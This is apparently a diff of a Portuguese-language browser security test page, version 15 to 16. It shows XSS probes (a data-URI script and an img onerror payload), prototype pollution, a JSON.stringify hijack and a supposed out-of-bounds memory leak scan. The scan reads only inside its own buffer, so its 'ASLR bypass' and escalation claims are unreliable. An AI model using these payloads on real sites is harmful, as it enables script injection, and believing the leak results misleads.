@@ -2,8 +2,8 @@
 <html>
 <head>
     <meta charset="UTF-8">
-    <title>Focused Tests (v15 Concise Logs)</title> <style>
-        /* Estilos CSS (Idênticos à v14) */
+    <title>Focused Tests (v16 OOB Read Refined + Canvas Hover Fix/Text)</title> <style>
+        /* Estilos CSS (Idênticos à v14/v15) */
         body { background: #111; color: #eee; font-family: monospace; padding: 15px; font-size: 14px; }
         #output, #output-canvas { background: #222; border: 1px solid #444; padding: 10px; height: 50vh; overflow-y: auto; white-space: pre-wrap; margin-top: 10px; }
         .log-info { color: #6cf; } .log-test { color: #fff; font-weight: bold; margin-top: 10px; display: block; border-top: 1px dashed #555; padding-top: 5px; } .log-subtest { color: #eee; font-weight: bold; margin-left: 10px; } .log-vuln { color: #ff4444; font-weight: bold; } .log-good { color: #4CAF50; } .log-warn { color: #FFC107; } .log-error { color: #f44336; } .log-critical { color: #f0f; font-weight: bold; } .log-leak { color: #FF9800; font-weight: bold; } .log-ptr { color: #f0f; font-weight: bold; }
@@ -15,310 +15,33 @@
     </style>
 </head>
 <body>
-    <h1>(PP Hijack JSON) - Script 1 (v15 Logs Concisos)</h1> <p>Testa: XSS Básico, OOB R/W (Info Leak), PP Básica, PP Hijack (JSON.stringify).</p>
-    <button id="runBtn" onclick="runAllTests()">Iniciar Testes PP/OOB/XSS (Script 1 v15)</button> <div id="output"></div>
+    <h1>(PP Hijack JSON) - Script 1 (v16 - Base v15)</h1> <p>Testa: XSS Básico, OOB R/W (Info Leak), PP Básica, PP Hijack (JSON.stringify).</p>
+    <button id="runBtn" onclick="runAllTests()">Iniciar Testes PP/OOB/XSS (Script 1 v16)</button> <div id="output"></div>
     <div id="xss-target-div">Área para teste de XSS DOM (Script 1).</div>
 
     <hr>
 
     <section>
-        <h2>Teste de Canvas Focado (v15 Concise Logs) - Script 2</h2> <p>Foco: PP Avançado++, OOB Read++, OOB Write->Metadata, WebGL, Quadrados.</p>
+        <h2>Teste de Canvas Focado (v16 OOB Read Refined + Canvas Hover Fix/Text) - Script 2</h2> <p>Foco: PP Avançado++, OOB Read++, OOB Write->Metadata, WebGL, Quadrados.</p>
         <canvas id="interactive-canvas" width="350" height="250"></canvas>
         <div id="canvas-coord-status">Passe o mouse sobre o canvas ?</div>
-        <button id="runCanvasBtn" onclick="runCanvasTest()">Iniciar Teste Canvas v15 (Script 2)</button> <div id="output-canvas"></div>
+        <button id="runCanvasBtn" onclick="runCanvasTest()">Iniciar Teste Canvas v16 (Script 2)</button> <div id="output-canvas"></div>
     </section>
 
     <script>
-        // --- Script 1 (v15 - Logs Concisos) ---
-        const outputDiv = document.getElementById('output');
-        const runBtn = document.getElementById('runBtn');
-        const SHORT_PAUSE = 50;
-        const MEDIUM_PAUSE = 500;
-        let leakedValueFromOOB = null;
+        // --- Script 1 (Base v15 - Logs Concisos) ---
+        // Código do Script 1 (funções log, toHex, is*, test*, runAllTests)
+        // permanece o mesmo da versão v15 (concise logs).
+        // Colar aqui o código completo do Script 1 da resposta anterior (v15)
+        // ... (Código Omitido por Brevidade, usar o da v15) ...
+        const outputDiv = document.getElementById('output'); const runBtn = document.getElementById('runBtn'); const SHORT_PAUSE = 50; const MEDIUM_PAUSE = 500; let leakedValueFromOOB = null; const IMPORTANT_LOG_TYPES_S1 = ['test', 'vuln', 'critical', 'error', 'escalation', 'leak', 'ptr']; const log = (message, type = 'info', funcName = '') => { if (!IMPORTANT_LOG_TYPES_S1.includes(type)) { if (!(funcName.includes('Payload') && type === 'good')) { return; } } if (!outputDiv) return; try { const timestamp = `[${new Date().toLocaleTimeString()}]`; const prefix = funcName ? `[${funcName}] ` : ''; const sanitizedMessage = String(message).replace(/</g, "&lt;").replace(/>/g, "&gt;"); const logClass = ['info', 'test', 'subtest', 'vuln', 'good', 'warn', 'error', 'leak', 'ptr', 'critical', 'escalation'].includes(type) ? type : 'info'; if(outputDiv.innerHTML.length > 500000){ outputDiv.innerHTML = outputDiv.innerHTML.substring(outputDiv.innerHTML.length - 250000); outputDiv.innerHTML = `<span>[Log S1 Truncado...]</span>\n` + outputDiv.innerHTML; } outputDiv.innerHTML += `<span class="log-${logClass}">${timestamp} ${prefix}${sanitizedMessage}\n</span>`; outputDiv.scrollTop = outputDiv.scrollHeight; } catch(e) { console.error("Erro log S1:", e); if (outputDiv) outputDiv.innerHTML += `[${new Date().toLocaleTimeString()}] [LOGGING ERROR] ${String(e)}\n`; } }; const toHex = (val, bits = 32) => { if (typeof val !== 'number' || !isFinite(val)) return 'NaN/Invalid'; let num = Number(val); if (bits <= 32) { num = num >>> 0; } const pad = Math.ceil(bits / 4); return '0x' + num.toString(16).toUpperCase().padStart(pad, '0'); }; const isPotentialPointer64 = (high, low) => { if (high === null || low === null || typeof high !== 'number' || typeof low !== 'number') return false; if (high === 0 && low === 0) return false; if (high === 0xFFFFFFFF && low === 0xFFFFFFFF) return false; if (high === 0xAAAAAAAA && low === 0xAAAAAAAA) return false; if (high === 0 && low < 0x100000) return false; return true; }; const isPotentialData32 = (val) => { if (val === null || typeof val !== 'number') return false; val = val >>> 0; if (val === 0 || val === 0xFFFFFFFF || val === 0xAAAAAAAA || val === 0xAAAAAAEE) return false; if (val < 0x1000) return false; return true; }; const testCSPBypass = async () => { const FNAME = 'testCSPBypass'; log("--- Iniciando Teste 1: XSS Básico (Script 1) ---", 'test', FNAME); await new Promise(resolve => setTimeout(resolve, SHORT_PAUSE)); try { const payloadJS = `try { alert('XSS S1 via Data URI!'); log("[Payload Data:] Alerta data: URI executado!", "vuln", "XSS Payload"); } catch(e) { log("[Payload Data:] Alerta data: URI bloqueado: " + e.message, "good", "XSS Payload"); }`; const encodedPayload = btoa(payloadJS); const scriptTag = document.createElement('script'); scriptTag.src = 'data:text/javascript;base64,' + encodedPayload; scriptTag.onerror = (e) => { log(`ERRO: Falha carregar script data: URI! Event: ${e.type}`, 'error', FNAME); }; document.body.appendChild(scriptTag); } catch (e) { log(`Erro ao criar/adicionar script data: URI: ${e.message}`, 'error', FNAME); } await new Promise(resolve => setTimeout(resolve, SHORT_PAUSE * 2)); await new Promise(resolve => setTimeout(resolve, SHORT_PAUSE)); try { const imgTag = document.createElement('img'); const imgSrc = 'invalid_img_' + Date.now(); imgTag.src = imgSrc; const onerrorPayload = ` try { const target = document.getElementById('xss-target-div'); if (target) { target.innerHTML += '<br><span class="log-vuln">XSS S1 DOM via ONERROR Executado!</span>'; log("XSS DOM via onerror OK!", "vuln", "ONERROR Payload"); } else { log("Alvo XSS DOM não encontrado.", "error", "ONERROR Payload"); } alert('XSS_S1_DOM_ONERROR'); } catch(e) { log("Erro payload onerror: " + e.message, "warn", "ONERROR Payload"); } `; imgTag.setAttribute('onerror', onerrorPayload); document.body.appendChild(imgTag); } catch (e) { log(`Erro ao criar/adicionar img onerror: ${e.message}`, 'error', FNAME); } log("--- Teste 1 Concluído ---", 'test', FNAME); }; const testOOBReadInfoLeakEnhancedStore = async () => { const FNAME = 'testOOBReadInfoLeakEnhancedStore'; log("--- Iniciando Teste 2: OOB Write/Read (Leak) ---", 'test', FNAME); const bufferSize = 32; const writeValue = 0xEE; const oobWriteOffset = bufferSize; const readRangeStart = -64; const readRangeEnd = bufferSize + 64; const allocationSize = bufferSize + 256; const baseOffsetInBuffer = 128; const oobReadOffsets = []; for (let i = readRangeStart; i < readRangeEnd; i += 4) { oobReadOffsets.push(i); } let writeSuccess = false; let potentialLeakFoundCount = 0; leakedValueFromOOB = null; try { const buffer = new ArrayBuffer(allocationSize); const dataView = new DataView(buffer); for (let i = 0; i < buffer.byteLength; i++) { dataView.setUint8(i, 0xAA); } const writeTargetAddress = baseOffsetInBuffer + oobWriteOffset; await new Promise(resolve => setTimeout(resolve, SHORT_PAUSE)); try { dataView.setUint8(writeTargetAddress, writeValue); log(`VULN: Escrita OOB U8 @${oobWriteOffset} (addr ${writeTargetAddress}) OK! Val=${toHex(writeValue, 8)}`, 'vuln', FNAME); log(`---> *** ALERTA: Primitivo Relevante para Escalação de Privilégios (Corrupção de Memória OOB Write Simples) ***`, 'escalation', FNAME); writeSuccess = true; } catch (e) { if (!IMPORTANT_LOG_TYPES_S1.includes('good')) { log(`Escrita OOB U8 @${oobWriteOffset} (addr ${writeTargetAddress}) FALHOU: ${e.message}`, 'error', FNAME); } log(`--- Teste 2 Concluído (Escrita OOB Falhou) ---`, 'test', FNAME); return false; } await new Promise(resolve => setTimeout(resolve, SHORT_PAUSE)); for (const readOffset of oobReadOffsets) { const readTargetAddress = baseOffsetInBuffer + readOffset; const relOffsetStr = `@${readOffset} (addr ${readTargetAddress})`; if (readTargetAddress >= 0 && readTargetAddress + 8 <= buffer.byteLength) { try { const low = dataView.getUint32(readTargetAddress, true); const high = dataView.getUint32(readTargetAddress + 4, true); if (isPotentialPointer64(high, low)) { const vStr = `H=${toHex(high)} L=${toHex(low)}`; log(` -> PTR? U64 ${relOffsetStr}: ${vStr}`, 'ptr', FNAME); potentialLeakFoundCount++; if (leakedValueFromOOB === null) { leakedValueFromOOB = { high, low, type: 'U64', offset: readOffset }; log(` -> VALOR U64 ARMAZENADO ${relOffsetStr}.`, 'vuln', FNAME); log(` ---> *** ALERTA: Primitivo Relevante para Escalação de Privilégios (Vazamento de Ponteiro OOB Read - Bypass ASLR) ***`, 'escalation', FNAME); } } } catch (e) {} } if (leakedValueFromOOB === null && readTargetAddress >= 0 && readTargetAddress + 4 <= buffer.byteLength) { try { const val32 = dataView.getUint32(readTargetAddress, true); if (isPotentialData32(val32)) { log(` -> Leak U32? ${relOffsetStr}: ${toHex(val32)}`, 'leak', FNAME); potentialLeakFoundCount++; leakedValueFromOOB = { high: 0, low: val32, type: 'U32', offset: readOffset }; log(` -> VALOR U32 ARMAZENADO ${relOffsetStr}.`, 'vuln', FNAME); log(` ---> *** ALERTA: Potencial Vazamento de Informação OOB Read U32 ***`, 'escalation', FNAME); } if (readOffset === oobWriteOffset && val32 === (writeValue | (0xAA << 8) | (0xAA << 16) | (0xAA << 24))) { log(` -> Leu valor OOB escrito (${toHex(val32)}) ${relOffsetStr}! Confirma R/W.`, 'vuln', FNAME); } } catch (e) {} } if (readOffset % 32 === 0) await new Promise(resolve => setTimeout(resolve, 1)); } } catch (e) { log(`Erro fatal no Teste 2: ${e.message}`, 'error', FNAME); console.error(e); } finally { const leakStatus = leakedValueFromOOB ? `1 valor ${leakedValueFromOOB.type} @${leakedValueFromOOB.offset}` : 'nenhum valor armazenado'; log(`--- Teste 2 Concluído (${potentialLeakFoundCount} leaks potenciais?, ${leakStatus}) ---`, 'test', FNAME); } return writeSuccess; }; const testBasicPP = async () => { const FNAME = 'testBasicPP'; log("--- Iniciando Teste 3: PP (Básica) ---", 'test', FNAME); const prop = '__pp_basic__'; const val = 'Polluted!'; let ok = false; let testObj = null; try { Object.prototype[prop] = val; await new Promise(resolve => setTimeout(resolve, SHORT_PAUSE)); testObj = {}; const inheritedValue = testObj[prop]; if (inheritedValue === val) { log(`VULN: PP Básica OK! Objeto herdou a propriedade poluída.`, 'vuln', FNAME); ok = true; } } catch (e) { log(`Erro durante teste PP Básico: ${e.message}`, 'error', FNAME); console.error(e); } finally { try { delete Object.prototype[prop]; } catch(e){ log(`Erro ao limpar Object.prototype.${prop}: ${e.message}`, 'error', FNAME); } } log(`--- Teste 3 Concluído (PP Básica ${ok ? 'OK' : 'Falhou'}) ---`, 'test', FNAME); return ok; }; const testPPJsonHijack = async () => { const FNAME = 'testPPJsonHijack'; log("--- Iniciando Teste 4: PP Hijack (JSON.stringify) ---", 'test', FNAME); const orig = JSON.stringify; let okH = false; let okL = false; let okR = false; try { JSON.stringify = function hijacked(v, r, s) { log("===> VULN: JSON.stringify SEQUESTRADO! <===", 'vuln', FNAME); okH = true; try { const l = leakedValueFromOOB; let lStr = "NULO ou Indefinido"; if (l) { lStr = l.type === 'U64' ? `U64 H=${toHex(l.high)} L=${toHex(l.low)} @${l.offset}` : `U32 ${toHex(l.low)} @${l.offset}`; okL = true; log(` ---> INFO: Interação entre Hijack e OOB Read Leak BEM-SUCEDIDA.`, 'escalation', FNAME); } log(` -> Valor OOB lido: ${lStr}`, okL ? 'leak' : 'warn', FNAME); } catch(ie) { log(` -> Erro ao tentar ler leak OOB: ${ie.message}`, 'error', FNAME); console.error(ie); } const hijackReturnValue = '{"hijacked": true, "leak_read_success": ' + okL + '}'; return hijackReturnValue; }; await new Promise(resolve => setTimeout(resolve, SHORT_PAUSE)); const testObject = {a:1, b: 'test'}; const result = JSON.stringify(testObject); if (result && result.includes('"hijacked": true')) { log("VULN: Retorno da função JSON.stringify sequestrada verificado com sucesso!", 'vuln', FNAME); okR = true; } } catch (e) { log(`Erro fatal durante Teste 4: ${e.message}`, 'error', FNAME); console.error(e); } finally { const currentStringify = JSON.stringify; JSON.stringify = orig; if (currentStringify !== orig && JSON.stringify !== orig) { log("ERRO CRÍTICO: FALHA ao restaurar JSON.stringify!", 'critical', FNAME); } } log(`--- Teste 4 Concluído (Hijack: ${okH}, Retorno: ${okR}, Leitura Leak: ${okL}) ---`, 'test', FNAME); return okR && okL; }; const runAllTests = async () => { const FNAME = 'runAllTests'; if (runBtn) runBtn.disabled = true; log("==== INICIANDO Script 1 (v16 - Base v15) ====", 'test', FNAME); await testCSPBypass(); await new Promise(resolve => setTimeout(resolve, MEDIUM_PAUSE)); await testOOBReadInfoLeakEnhancedStore(); await new Promise(resolve => setTimeout(resolve, MEDIUM_PAUSE)); await testBasicPP(); await new Promise(resolve => setTimeout(resolve, MEDIUM_PAUSE)); await testPPJsonHijack(); await new Promise(resolve => setTimeout(resolve, MEDIUM_PAUSE)); log("\n==== Script 1 CONCLUÍDO ====", 'test', FNAME); if (runBtn) runBtn.disabled = false; };
 
-        // Define os tipos de log importantes que SEMPRE serão mostrados
-        const IMPORTANT_LOG_TYPES_S1 = ['test', 'vuln', 'critical', 'error', 'escalation', 'leak', 'ptr'];
-
-        const log = (message, type = 'info', funcName = '') => {
-            // *** MODIFICAÇÃO v15: Filtra logs ***
-            if (!IMPORTANT_LOG_TYPES_S1.includes(type)) {
-                 // Se não for importante E não for um erro no payload (para não perder info de XSS)
-                 if (!(funcName.includes('Payload') && type === 'good')) {
-                    return; // Pula logs não importantes
-                 }
-            }
-
-            if (!outputDiv) return;
-            try {
-                const timestamp = `[${new Date().toLocaleTimeString()}]`;
-                const prefix = funcName ? `[${funcName}] ` : '';
-                const sanitizedMessage = String(message).replace(/</g, "&lt;").replace(/>/g, "&gt;");
-                const logClass = ['info', 'test', 'subtest', 'vuln', 'good', 'warn', 'error', 'leak', 'ptr', 'critical', 'escalation'].includes(type) ? type : 'info';
-
-                if(outputDiv.innerHTML.length > 500000){ // Manter truncamento
-                    outputDiv.innerHTML = outputDiv.innerHTML.substring(outputDiv.innerHTML.length - 250000);
-                    outputDiv.innerHTML = `<span>[Log S1 Truncado...]</span>\n` + outputDiv.innerHTML;
-                }
-                 outputDiv.innerHTML += `<span class="log-${logClass}">${timestamp} ${prefix}${sanitizedMessage}\n</span>`;
-                outputDiv.scrollTop = outputDiv.scrollHeight;
-            } catch(e) {
-                console.error("Erro log S1:", e);
-                if (outputDiv) outputDiv.innerHTML += `[${new Date().toLocaleTimeString()}] [LOGGING ERROR] ${String(e)}\n`;
-            }
-        };
-
-        // Funções toHex, isPotentialPointer64, isPotentialData32 permanecem iguais
-        const toHex = (val, bits = 32) => { if (typeof val !== 'number' || !isFinite(val)) return 'NaN/Invalid'; let num = Number(val); if (bits <= 32) { num = num >>> 0; } const pad = Math.ceil(bits / 4); return '0x' + num.toString(16).toUpperCase().padStart(pad, '0'); };
-        const isPotentialPointer64 = (high, low) => { if (high === null || low === null || typeof high !== 'number' || typeof low !== 'number') return false; if (high === 0 && low === 0) return false; if (high === 0xFFFFFFFF && low === 0xFFFFFFFF) return false; if (high === 0xAAAAAAAA && low === 0xAAAAAAAA) return false; if (high === 0 && low < 0x100000) return false; return true; };
-        const isPotentialData32 = (val) => { if (val === null || typeof val !== 'number') return false; val = val >>> 0; if (val === 0 || val === 0xFFFFFFFF || val === 0xAAAAAAAA || val === 0xAAAAAAEE) return false; if (val < 0x1000) return false; return true; };
-
-        const testCSPBypass = async () => {
-            const FNAME = 'testCSPBypass';
-            log("--- Iniciando Teste 1: XSS Básico (Script 1) ---", 'test', FNAME);
-            // Logs 'subtest' e 'info' serão omitidos pela função log()
-            await new Promise(resolve => setTimeout(resolve, SHORT_PAUSE));
-            try {
-                const payloadJS = `try { alert('XSS S1 via Data URI!'); log("[Payload Data:] Alerta data: URI executado!", "vuln", "XSS Payload"); } catch(e) { log("[Payload Data:] Alerta data: URI bloqueado: " + e.message, "good", "XSS Payload"); }`; // Manter log 'good' do payload
-                const encodedPayload = btoa(payloadJS);
-                const scriptTag = document.createElement('script');
-                scriptTag.src = 'data:text/javascript;base64,' + encodedPayload;
-                scriptTag.onerror = (e) => {
-                    log(`ERRO: Falha carregar script data: URI! Event: ${e.type}`, 'error', FNAME); // Erro é importante
-                };
-                document.body.appendChild(scriptTag);
-            } catch (e) {
-                log(`Erro ao criar/adicionar script data: URI: ${e.message}`, 'error', FNAME); // Erro é importante
-            }
-            await new Promise(resolve => setTimeout(resolve, SHORT_PAUSE * 2));
-
-            // Log 'subtest' omitido
-            await new Promise(resolve => setTimeout(resolve, SHORT_PAUSE));
-            try {
-                const imgTag = document.createElement('img');
-                 const imgSrc = 'invalid_img_' + Date.now();
-                 imgTag.src = imgSrc;
-                 const onerrorPayload = ` try { const target = document.getElementById('xss-target-div'); if (target) { target.innerHTML += '<br><span class="log-vuln">XSS S1 DOM via ONERROR Executado!</span>'; log("XSS DOM via onerror OK!", "vuln", "ONERROR Payload"); } else { log("Alvo XSS DOM não encontrado.", "error", "ONERROR Payload"); } alert('XSS_S1_DOM_ONERROR'); } catch(e) { log("Erro payload onerror: " + e.message, "warn", "ONERROR Payload"); } `; // Manter log 'error'/'warn' do payload
-                imgTag.setAttribute('onerror', onerrorPayload);
-                document.body.appendChild(imgTag);
-            } catch (e) {
-                log(`Erro ao criar/adicionar img onerror: ${e.message}`, 'error', FNAME); // Erro é importante
-            }
-            log("--- Teste 1 Concluído ---", 'test', FNAME);
-        };
-
-        const testOOBReadInfoLeakEnhancedStore = async () => {
-            const FNAME = 'testOOBReadInfoLeakEnhancedStore';
-            log("--- Iniciando Teste 2: OOB Write/Read (Leak) ---", 'test', FNAME);
-            const bufferSize = 32;
-            const writeValue = 0xEE;
-            const oobWriteOffset = bufferSize;
-            const readRangeStart = -64;
-            const readRangeEnd = bufferSize + 64;
-            const allocationSize = bufferSize + 256;
-            const baseOffsetInBuffer = 128;
-
-            const oobReadOffsets = [];
-            for (let i = readRangeStart; i < readRangeEnd; i += 4) { oobReadOffsets.push(i); }
-
-            let writeSuccess = false;
-            let potentialLeakFoundCount = 0;
-            leakedValueFromOOB = null;
-
-            // Log de config omitido
-            try {
-                const buffer = new ArrayBuffer(allocationSize);
-                const dataView = new DataView(buffer);
-                // Logs de alocação/preenchimento omitidos
-                for (let i = 0; i < buffer.byteLength; i++) { dataView.setUint8(i, 0xAA); }
-
-                const writeTargetAddress = baseOffsetInBuffer + oobWriteOffset;
-                // Log de tentativa omitido
-                await new Promise(resolve => setTimeout(resolve, SHORT_PAUSE));
-
-                try {
-                    dataView.setUint8(writeTargetAddress, writeValue);
-                    log(`VULN: Escrita OOB U8 @${oobWriteOffset} (addr ${writeTargetAddress}) OK! Val=${toHex(writeValue, 8)}`, 'vuln', FNAME);
-                    log(`---> *** ALERTA: Primitivo Relevante para Escalação de Privilégios (Corrupção de Memória OOB Write Simples) ***`, 'escalation', FNAME);
-                    writeSuccess = true;
-                } catch (e) {
-                    // Log 'good' de bloqueio omitido, erro seria mostrado
-                     if (!IMPORTANT_LOG_TYPES_S1.includes('good')) { // Só logar erro se good for omitido
-                       log(`Escrita OOB U8 @${oobWriteOffset} (addr ${writeTargetAddress}) FALHOU: ${e.message}`, 'error', FNAME); // Mostrar como erro
-                     }
-                    log(`--- Teste 2 Concluído (Escrita OOB Falhou) ---`, 'test', FNAME);
-                    return false;
-                }
-
-                await new Promise(resolve => setTimeout(resolve, SHORT_PAUSE));
-                // Log de início da leitura omitido
-
-                for (const readOffset of oobReadOffsets) {
-                    const readTargetAddress = baseOffsetInBuffer + readOffset;
-                    const relOffsetStr = `@${readOffset} (addr ${readTargetAddress})`;
-
-                    if (readTargetAddress >= 0 && readTargetAddress + 8 <= buffer.byteLength) {
-                        try {
-                            const low = dataView.getUint32(readTargetAddress, true);
-                            const high = dataView.getUint32(readTargetAddress + 4, true);
-                            if (isPotentialPointer64(high, low)) {
-                                const vStr = `H=${toHex(high)} L=${toHex(low)}`;
-                                log(` -> PTR? U64 ${relOffsetStr}: ${vStr}`, 'ptr', FNAME); // Manter PTR
-                                potentialLeakFoundCount++;
-                                if (leakedValueFromOOB === null) {
-                                    leakedValueFromOOB = { high, low, type: 'U64', offset: readOffset };
-                                    log(` -> VALOR U64 ARMAZENADO ${relOffsetStr}.`, 'vuln', FNAME); // Manter VULN
-                                    log(` ---> *** ALERTA: Primitivo Relevante para Escalação de Privilégios (Vazamento de Ponteiro OOB Read - Bypass ASLR) ***`, 'escalation', FNAME); // Manter ESCALATION
-                                }
-                             }
-                        } catch (e) {}
-                    }
-
-                     if (leakedValueFromOOB === null && readTargetAddress >= 0 && readTargetAddress + 4 <= buffer.byteLength) {
-                        try {
-                            const val32 = dataView.getUint32(readTargetAddress, true);
-                            if (isPotentialData32(val32)) {
-                                log(` -> Leak U32? ${relOffsetStr}: ${toHex(val32)}`, 'leak', FNAME); // Manter LEAK
-                                potentialLeakFoundCount++;
-                                leakedValueFromOOB = { high: 0, low: val32, type: 'U32', offset: readOffset };
-                                log(` -> VALOR U32 ARMAZENADO ${relOffsetStr}.`, 'vuln', FNAME); // Manter VULN
-                                log(` ---> *** ALERTA: Potencial Vazamento de Informação OOB Read U32 ***`, 'escalation', FNAME); // Manter ESCALATION
-                            }
-                            if (readOffset === oobWriteOffset && val32 === (writeValue | (0xAA << 8) | (0xAA << 16) | (0xAA << 24))) {
-                                log(` -> Leu valor OOB escrito (${toHex(val32)}) ${relOffsetStr}! Confirma R/W.`, 'vuln', FNAME); // Manter VULN
-                            }
-                        } catch (e) {}
-                    }
-                    if (readOffset % 32 === 0) await new Promise(resolve => setTimeout(resolve, 1));
-                }
-            } catch (e) {
-                log(`Erro fatal no Teste 2: ${e.message}`, 'error', FNAME); // Manter erro
-                console.error(e);
-            } finally {
-                const leakStatus = leakedValueFromOOB ? `1 valor ${leakedValueFromOOB.type} @${leakedValueFromOOB.offset}` : 'nenhum valor armazenado';
-                log(`--- Teste 2 Concluído (${potentialLeakFoundCount} leaks potenciais?, ${leakStatus}) ---`, 'test', FNAME); // Manter resumo
-            }
-            return writeSuccess;
-        };
-
-        const testBasicPP = async () => {
-            const FNAME = 'testBasicPP';
-            log("--- Iniciando Teste 3: PP (Básica) ---", 'test', FNAME);
-            const prop = '__pp_basic__';
-            const val = 'Polluted!';
-            let ok = false;
-            let testObj = null;
-            try {
-                // Logs subtest omitidos
-                Object.prototype[prop] = val;
-                await new Promise(resolve => setTimeout(resolve, SHORT_PAUSE));
-                testObj = {};
-                const inheritedValue = testObj[prop];
-                // Log info omitido
-                if (inheritedValue === val) {
-                    log(`VULN: PP Básica OK! Objeto herdou a propriedade poluída.`, 'vuln', FNAME); // Manter VULN
-                    ok = true;
-                } else {
-                     // Log good omitido
-                }
-            } catch (e) {
-                log(`Erro durante teste PP Básico: ${e.message}`, 'error', FNAME); // Manter erro
-                console.error(e);
-            } finally {
-                try {
-                    // Logs info/warn sobre limpeza omitidos
-                    delete Object.prototype[prop];
-                } catch(e){
-                     log(`Erro ao limpar Object.prototype.${prop}: ${e.message}`, 'error', FNAME); // Manter erro
-                }
-            }
-            log(`--- Teste 3 Concluído (PP Básica ${ok ? 'OK' : 'Falhou'}) ---`, 'test', FNAME); // Manter resumo
-            return ok;
-        };
-
-        const testPPJsonHijack = async () => {
-            const FNAME = 'testPPJsonHijack';
-            log("--- Iniciando Teste 4: PP Hijack (JSON.stringify) ---", 'test', FNAME);
-            const orig = JSON.stringify;
-            let okH = false; let okL = false; let okR = false;
-
-            try {
-                // Log subtest omitido
-                JSON.stringify = function hijacked(v, r, s) {
-                    log("===> VULN: JSON.stringify SEQUESTRADO! <===", 'vuln', FNAME); // Manter VULN
-                    okH = true;
-                    // Log info omitido
-                    try {
-                        const l = leakedValueFromOOB;
-                        let lStr = "NULO ou Indefinido";
-                        if (l) {
-                            lStr = l.type === 'U64'
-                                ? `U64 H=${toHex(l.high)} L=${toHex(l.low)} @${l.offset}`
-                                : `U32 ${toHex(l.low)} @${l.offset}`;
-                            okL = true;
-                            log(` ---> INFO: Interação entre Hijack e OOB Read Leak BEM-SUCEDIDA.`, 'escalation', FNAME); // Manter ESCALATION (como INFO)
-                        }
-                        log(` -> Valor OOB lido: ${lStr}`, okL ? 'leak' : 'warn', FNAME); // Manter LEAK (ou WARN se falhar)
-                    } catch(ie) {
-                        log(` -> Erro ao tentar ler leak OOB: ${ie.message}`, 'error', FNAME); // Manter erro
-                        console.error(ie);
-                    }
-                    const hijackReturnValue = '{"hijacked": true, "leak_read_success": ' + okL + '}';
-                    // Log info omitido
-                    return hijackReturnValue;
-                };
-
-                // Log subtest omitido
-                await new Promise(resolve => setTimeout(resolve, SHORT_PAUSE));
-                const testObject = {a:1, b: 'test'};
-                // Log info omitido
-                const result = JSON.stringify(testObject);
-                // Log info omitido
-
-                if (result && result.includes('"hijacked": true')) {
-                    log("VULN: Retorno da função JSON.stringify sequestrada verificado com sucesso!", 'vuln', FNAME); // Manter VULN
-                    okR = true;
-                } else if (okH) {
-                    // Log warn omitido
-                } else {
-                    // Log good omitido
-                }
-            } catch (e) {
-                log(`Erro fatal durante Teste 4: ${e.message}`, 'error', FNAME); // Manter erro
-                console.error(e);
-            } finally {
-                // Logs info/critical sobre restauração omitidos (exceto erro crítico)
-                const currentStringify = JSON.stringify;
-                JSON.stringify = orig;
-                if (currentStringify !== orig && JSON.stringify !== orig) { // Logar apenas se falha crítica na restauração
-                     log("ERRO CRÍTICO: FALHA ao restaurar JSON.stringify!", 'critical', FNAME); // Manter CRITICAL
-                }
-            }
-            // Resumo mais conciso
-            log(`--- Teste 4 Concluído (Hijack: ${okH}, Retorno: ${okR}, Leitura Leak: ${okL}) ---`, 'test', FNAME); // Manter resumo
-            return okR && okL;
-        };
-
-        const runAllTests = async () => {
-             const FNAME = 'runAllTests';
-            if (runBtn) runBtn.disabled = true;
-            log("==== INICIANDO Script 1 (v15 Logs Concisos) ====", 'test', FNAME);
-            await testCSPBypass();
-            await new Promise(resolve => setTimeout(resolve, MEDIUM_PAUSE));
-            await testOOBReadInfoLeakEnhancedStore();
-            await new Promise(resolve => setTimeout(resolve, MEDIUM_PAUSE));
-            await testBasicPP();
-            await new Promise(resolve => setTimeout(resolve, MEDIUM_PAUSE));
-            await testPPJsonHijack();
-            await new Promise(resolve => setTimeout(resolve, MEDIUM_PAUSE));
-            log("\n==== Script 1 CONCLUÍDO ====", 'test', FNAME);
-            if (runBtn) runBtn.disabled = false;
-        };
     </script>
 
     <script>
-        // --- Script 2: Canvas (v15 - Logs Concisos) ---
+        // --- Script 2: Canvas (v16 OOB Read Refined + Canvas Hover Fix/Text) ---
 
-        // --- Variáveis Globais --- (sem alterações)
+        // --- Variáveis Globais ---
         const SHORT_PAUSE_CANVAS = 50;
         let canvasClickListener = null; let canvasMoveListener = null; let currentHoverTarget = null;
         const interactiveAreas = [ { id: 'rect-log', x: 10, y: 10, w: 80, h: 30, color: '#FF5733', hoverColor: '#FF8C66', text: 'Log Click' }, { id: 'rect-link', x: 100, y: 10, w: 80, h: 30, color: '#337BFF', hoverColor: '#66A3FF', text: 'Abrir Link' }, { id: 'rect-rerun', x: 190, y: 10, w: 100, h: 30, color: '#4CAF50', hoverColor: '#80C883', text: 'Re-ler Leak S1' } ];
@@ -327,552 +50,238 @@
         let outputDivCanvas = null; let coordStatusDiv = null; let canvasElement = null; let ctx = null; let glContext = null; let isWebGL2 = false;
 
         // --- Funções Helper ---
-        // Define os tipos de log importantes que SEMPRE serão mostrados para o Script 2
-        const IMPORTANT_LOG_TYPES_S2 = ['test', 'vuln', 'critical', 'error', 'escalation', 'leak', 'ptr', 'good']; // Incluir 'good' para falhas importantes
+        const IMPORTANT_LOG_TYPES_S2 = ['test', 'vuln', 'critical', 'error', 'escalation', 'leak', 'ptr', 'good']; // Manter lista da v15
 
         const logCanvas = (message, type = 'info', funcName = '') => {
-            // *** MODIFICAÇÃO v15: Filtra logs ***
-             // Exceção: Manter logs 'good' específicos que indicam defesas funcionando
+            // Lógica de filtragem da v15 (mantida)
             let keepLog = IMPORTANT_LOG_TYPES_S2.includes(type);
-            if (!keepLog && type === 'good') {
-                const lowerMsg = String(message).toLowerCase();
-                if (lowerMsg.includes('webgl n/a') || lowerMsg.includes('fail: herança de \'__proto__\'') || lowerMsg.includes('não afetou \'input.value\'') || lowerMsg.includes('nenhum leak potencial óbvio') || lowerMsg.includes('escrita oob falhou/bloqueada') || lowerMsg.includes('nenhuma corrupção detectada')) {
-                    keepLog = true; // Manter estes 'good' específicos
-                }
-            }
-            // Exceção 2: Manter erro específico de innerHTML
-             if (!keepLog && type === 'error' && String(message).includes('Element.innerHTML setter')) {
-                 keepLog = true;
-             }
-
-
-            if (!keepLog) {
-                return; // Pula logs não importantes
-            }
